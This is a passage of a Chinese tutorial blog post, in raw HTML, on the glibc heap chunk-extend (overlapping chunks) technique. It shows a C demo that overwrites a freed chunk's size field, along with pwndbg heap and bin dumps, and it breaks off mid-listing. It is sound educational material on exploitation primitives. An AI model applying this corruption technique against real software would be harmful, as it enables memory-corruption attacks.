shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0xb1</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555557580b0</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555557580d0</span><br><span class=\"line\">Size: 0x20f31</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bins</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x0</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/40gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x00000000000000b1\t\t\t&lt;======Chunk1</span><br><span class=\"line\">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758090: 0x0000000000000000  0x0000000000000021\t\t\t&lt;======Chunk2</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000000021\t\t\t&lt;======Chunk3</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000020f31\t\t\t&lt;======Top Chunk</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t下一步，free 掉 chunk1：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0xb1</span><br><span class=\"line\">fd: 0x7ffff7dd1b78</span><br><span class=\"line\">bk: 0x7ffff7dd1b78</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk</span><br><span class=\"line\">Addr: 0x5555557580b0</span><br><span class=\"line\">Size: 0x20</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555557580d0</span><br><span class=\"line\">Size: 0x20f31</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bin</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x555555758000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555758000</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/40gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x00000000000000b1\t\t\t&lt;======Chunk1</span><br><span class=\"line\">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758090: 0x0000000000000000  0x0000000000000021\t\t\t&lt;======Chunk2</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x00000000000000b0  0x0000000000000020\t\t\t&lt;======Chunk3</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000020f31\t\t\t&lt;======Top Chunk</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里发现了一个点需要注意，就是 free 掉 size 域修改了之后的那个 chunk1 之后，chunk3 的 size 域的最低为，也就是 p 位，变成了 0，这也就说明，chunk1 没有放在 fastbin 里，上面也看到了，被放在了 unsortedbin 里。</p>\n<p>​\t\t那么为啥会被放入 unsortedbin 内而不是 smallbin 呢？估计有一下几种可能：</p>\n<ul>\n<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsortedbin 中。</li>\n<li>释放一个不属于 fastbin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 就会被放到 unsorted bin 中，当第二次分配的时候，没有在 unsortedbin 中找到合适的，才会被放入到其对应的 bin 中。</li>\n</ul>\n<p>​\t\t之后进行分配，分配 0xa0 大小的堆块，就会发现，原 chunk1 的地址依旧拿去用了：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0xb1</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555557580b0</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555557580d0</span><br><span class=\"line\">Size: 0x20f31</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bin</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x0</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/40gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x00000000000000b1</span><br><span class=\"line\">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758090: 0x0000000000000000  0x0000000000000021</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x00000000000000b0  0x0000000000000021</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000020f31</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-对free的smallbin进行extend\"><a class=\"markdownIt-Anchor\" href=\"#3-对free的smallbin进行extend\">#</a> 3、对 free 的 smallbin 进行 extend：</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//gcc -g 3.c</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">void</span> *ptr,*ptr1;</span><br><span class=\"line\"></span><br><span class=\"line\">    ptr=<span class=\"built_in\">malloc</span>(<span class=\"number\">0x80</span>);<span class=\"comment\">//分配第一个0x80的chunk1</span></span><br><span class=\"line\">    <span class=\"built_in\">malloc</span>(<span class=\"number\">0x10</span>);<span class=\"comment\">//分配第二个0x10的chunk2</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr);<span class=\"comment\">//首先进行释放，使得chunk1进入unsorted bin</span></span><br><span class=\"line\"></span><br><span class=\"line\">    *(<span class=\"type\">long</span> *)((<span class=\"type\">long</span>)ptr<span class=\"number\">-0x8</span>)=<span class=\"number\">0xb1</span>;</span><br><span class=\"line\">    ptr1=<span class=\"built_in\">malloc</span>(<span class=\"number\">0xa0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t首先是两次 malloc：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0x91</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758090</span><br><span class=\"line\">Size: 0x21</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555557580b0</span><br><span class=\"line\">Size: 0x20f51</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bins</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x0</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x0000000000000091\t\t\t&lt;======Chunk1</span><br><span class=\"line\">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758090: 0x0000000000000000  0x0000000000000021\t\t\t&lt;======Chunk2</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000020f51\t\t\t&lt;======Top Chunk</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后直接 free 掉 chunk1：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0x91</span><br><span class=\"line\">fd: 0x7ffff7dd1b78</span><br><span class=\"line\">bk: 0x7ffff7dd1b78</span><br><span class=\"line\"></span><br><span class=\"line\">Allocated chunk</span><br><span class=\"line\">Addr: 0x555555758090</span><br><span class=\"line\">Size: 0x20</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555557580b0</span><br><span class=\"line\">Size: 0x20f51</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bin</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x555555758000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555758000</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x0000000000000091\t\t\t&lt;======Chunk1</span><br><span class=\"line\">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758090: 0x0000000000000090  0x0000000000000020\t\t\t&lt;======Chunk2</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000020f51\t\t\t&lt;======Top Chunk</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里还是能看出来存在两个 chunk 的，当修改了 size 域大小后：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">heap</span></span><br><span class=\"line\">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class=\"line\">Addr: 0x555555758000</span><br><span class=\"line\">Size: 0xb1</span><br><span class=\"line\">fd: 0x7ffff7dd1b78</span><br><span class=\"line\">bk: 0x7ffff7dd1b78</span><br><span class=\"line\"></span><br><span class=\"line\">Top chunk | PREV_INUSE</span><br><span class=\"line\">Addr: 0x5555557580b0</span><br><span class=\"line\">Size: 0x20f51</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">bin</span></span><br><span class=\"line\">fastbins</span><br><span class=\"line\">0x20: 0x0</span><br><span class=\"line\">0x30: 0x0</span><br><span class=\"line\">0x40: 0x0</span><br><span class=\"line\">0x50: 0x0</span><br><span class=\"line\">0x60: 0x0</span><br><span class=\"line\">0x70: 0x0</span><br><span class=\"line\">0x80: 0x0</span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: 0x555555758000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555758000</span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\">empty</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">x/30gx 0x555555758000</span></span><br><span class=\"line\">0x555555758000: 0x0000000000000000  0x00000000000000b1</span><br><span class=\"line\">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class=\"line\">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x555555758090: 0x0000000000000090  0x0000000000000020</span><br><span class=\"line\">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580b0: 0x0000000000000000  0x0000000000020f51</span><br><span class=\"line\">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class=\"line\">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>​\t\t原本的三个 chunk 变成了两个，并且 chunk2 还是 allocated 状态，重叠之后，chunk1 是 free 状态，所以整个 chunk 依旧是 free 状态。之后 malloc (0xa0) 试试：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span 